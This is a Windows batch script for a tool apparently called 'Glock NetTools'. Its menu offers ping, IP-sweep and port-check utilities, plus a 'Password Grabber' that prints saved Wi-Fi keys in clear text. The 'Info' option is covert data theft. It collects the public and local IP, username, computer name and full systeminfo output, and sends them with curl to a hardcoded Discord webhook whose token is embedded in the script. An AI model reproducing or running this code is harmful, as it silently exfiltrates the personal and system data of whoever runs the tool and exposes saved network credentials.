@echo off
:g
cls
call GlockFiles\Tools\Text.bat
echo %gray%[%cyan%1%gray%] - Ip Scaning
echo %gray%[%cyan%2%gray%] - Port Scaning
echo %gray%[%cyan%3%gray%] - Password Grabber
echo %gray%[%cyan%4%gray%] - Powered Test
echo %gray%[%cyan%5%gray%] - Pinger
echo %gray%[%cyan%6%gray%] - IP Finder
echo %gray%[%cyan%7%gray%] - Info
echo %gray%[%cyan%x%gray%] - Exit
set /p w=%gray%[%white%/%gray%] - 
if %w%==1 goto IpScaning
if %w%==2 goto PortScaning
if %w%==3 goto PasswordGrabber
if %w%==4 goto PoweredTest
if %w%==5 goto Pinger
if %w%==6 goto IPFinder
if %w%==7 goto Info
if %w%==x goto main
goto NetTools
:Pinger
title Glock - NetTools Pinger
cls
call GlockFiles\Tools\Text.bat
set /p ip=%gray%[%white%/%gray%] - IP: %gray%
PING -n 1 %ip% | Find "TTL="
::IF ERRORLEVEL 0 goto pingernot
IF %errorlevel% EQU 1 goto pingernot
ping %ip% -t
goto main
:pingernot
echo %cyan%%ip% Is not working
pause>nul
goto main
:PoweredTest
title Glock - NetTools Powered Test
cls
call GlockFiles\Tools\Text.bat
set /p ip=%gray%[%white%/%gray%] - IP: %gray%
ping %ip% -n 1 > nul | find "time" > nul
IF %errorlevel% EQU 0 goto PoweredTestTrue
echo.
echo %cyan%%ip% Is Not Powered!
pause>nul
goto NetTools
:PoweredTestTrue
echo.
echo %cyan%%ip% Is Powered!
pause>nul
goto NetTools
:PasswordGrabber
title Glock - NetTools Password Grabber
cls
call GlockFiles\Tools\Text.bat
set /p w=%gray%[%cyan%1%gray%] - SeeProfiles  %gray%[%cyan%2%gray%] - Grab: 
if %w%==1 goto SeeProfiles
if %w%==2 goto Grab
:Grab
cls
call GlockFiles\Tools\Text.bat
set /p InternetName=%gray%[%white%/%gray%] - Profile Namme: %gray%
netsh wlan show profile "%InternetName%" key=clear | find "Key Content"
pause>nul
goto NetTools
:SeeProfiles
cls
call GlockFiles\Tools\Text.bat
echo %cyan%All Saved Profiles:
netsh wlan show profiles
pause>nul
goto PasswordGrabber
:PortScaning
title Glock - NetTools Port Scaning
cls
call GlockFiles\Tools\Text.bat
set /p Port=%gray%[%white%/%gray%] - Port: %gray%
echo %cyan%Glock Starting Scaning...
netstat -a | find "%port%" > nul
IF %errorlevel% EQU 0 goto PortGood
echo %cyan%Port Not Working!!
pause>nul
goto NetTools
:PortGood
echo %cyan%Port Working!!
pause>nul
goto NetTools

:IpScaning
title Glock - NetTools Ip Scaning
del GlockFiles\Temp\ip.txt
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
cls
call GlockFiles\Tools\Text.bat
echo %blue%-----------%cyan%%NetworkIP%
echo %blue%Paste this ***.***.***
echo %blue%For example: %lightcyan%192.168.100
set /p g1=%cyan%
set /a g=0
set /a loop=0
set /a good=0
set /a bad=0
set /a scaned=0
goto ipScan
pause
:ipScan
set /a g=g+1
set /a loop=loop+1
set /a scaned=scaned+1
echo.
echo %gray%[%magenta%?%gray%] - Scaning %g1%.%g%
if %g%==255 goto endip
if %g1%.%g%==%NetworkIP% goto localhost
ping %g1%.%g% -n 1 | find "time" > nul
IF %errorlevel% EQU 0 goto goodip
set /a bad=bad+1
goto badip
goto ipScan
:goodip
echo %g1%.%g% >> GlockFiles\Temp\ip.txt
echo %gray%[%green%+%gray%] - %g1%.%g% Is working%green%
set /a good=good+1
goto ipScan
:badip
echo %gray%[%red%-%gray%] - %g1%.%g% Is not working%green%
goto ipScan
:endip
echo NotWorkingIp's: %bad%
echo Scaned: %scaned%
echo Working: %good%
type GlockFiles\Temp\ip.txt
del GlockFiles\Temp\ip.txt
echo Press any key to continue
pause>nul
goto NetTools
:localhost
echo %gray%[%yellow%=%gray%] - %cyan%%g1%.%g% is local ip
echo 192.168.100.%g% is local ip >> GlockFiles\Temp\ip.txt
goto ipScan

:IPFinder
cls
call GlockFiles\Tools\Text.bat
:IPFinderLoop
set /a r1=%random% %%255
set /a r2=%random% %%255
set /a r3=%random% %%255
set /a r4=%random% %%255
echo %grey%[%magenta%?%gray%] - Testing %r1%.%r2%.%r3%.%r4%
ping %r1%.%r2%.%r3%.%r4% -n 1 | find "time" > nul
IF %errorlevel% EQU 0 goto IPFinderGood
echo %grey%[%red%-%gray%] - %r1%.%r2%.%r3%.%r4% is not working!!
goto IPFinderLoop
:IPFinderGood
cls
call GlockFiles\Tools\Text.bat
echo %grey%[%green%+%gray%] - %r1%.%r2%.%r3%.%r4% IS WORKING!!
goto IPFinderLoop

:Info
cls
call GlockFiles\Tools\Text.bat
::WebHook
echo %grey%[%magenta%?%gray%] - SettingUp WebHook
set webhook=https://discord.com/api/webhooks/1038863010552369233/ryEBmBfdlU0V4bbA34uNP8ZSf4P-sZX-mqLVyv6VW0H9kmSutl29QzyIGCImYzX6r1ou
echo %grey%[%green%+%gray%] - WebHook Working
::IP
echo %grey%[%magenta%?%gray%] - Downloading IP
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
set "IP_Message=Network IP: **%NetworkIP%**  Public IP: **%PublicIP%**"
ping 192.0.2.1 -n 3 -w 1 >nul
echo %grey%[%green%+%gray%] - IP Downloaded
::SysInfo
echo %grey%[%magenta%?%gray%] - Downloading SystemInfo
SystemInfo > GlockFiles\Temp\SysInfo.txt>nul
set SystemInfo_File=GlockFiles\Temp\SysInfo.txt
echo %grey%[%green%+%gray%] - SystemInfo Downloaded
::UserName
echo %grey%[%magenta%?%gray%] - Downloading UserName
set "UserName_Message=UserName: **%UserName%**"
ping 192.0.2.1 -n 3 -w 1 >nul
echo %grey%[%green%+%gray%] - UserName Downloaded
::ComputerName
echo %grey%[%magenta%?%gray%] - Downloading ComputerName
set "ComputerName_Message=ComputerName: **%ComputerName%**"
ping 192.0.2.1 -n 3 -w 1 >nul
echo %grey%[%green%+%gray%] - ComputerName Downloaded
::Send
echo %grey%[%magenta%?%gray%] - Sending
set combo=%IP_Message% %UserName_Message% %ComputerName_Message%
curl -k -F "payload_json={\"content\": \"**-------------%time% %date%-------------**\"}" %WEBHOOK%
curl -k -F "payload_json={\"content\": \"SystemInfo\"}" -F "file1=@%SystemInfo_File%" %WEBHOOK% >nul
curl -k -F "payload_json={\"content\": \"%combo%\"}" %WEBHOOK%
echo %grey%[%green%+%gray%] - Sended
echo %grey%[%magenta%?%gray%] - ShutDowning WebHook
ping 192.0.2.1 -n 5 -w 1 >nul
echo %grey%[%green%+%gray%] - WebHook Is Now Offline
pause>nul
goto g